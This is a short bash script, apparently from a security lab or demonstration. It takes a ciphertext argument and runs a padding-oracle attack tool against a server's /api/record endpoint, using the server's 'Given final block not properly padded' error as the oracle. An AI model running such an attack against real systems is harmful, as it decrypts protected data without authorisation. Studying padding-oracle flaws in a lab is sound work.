#!/bin/bash
. ./ip.sh
if [ "z$1" == "z" ] ; then
	echo "Chaine a dechiffrer obligatoire"
	exit 1
fi

./padding-oracle.py -c $1 --host $SERVER_IP:8080 -u /api/record --post transaction -l 16 --error 'Given final block not properly padded' --method POST
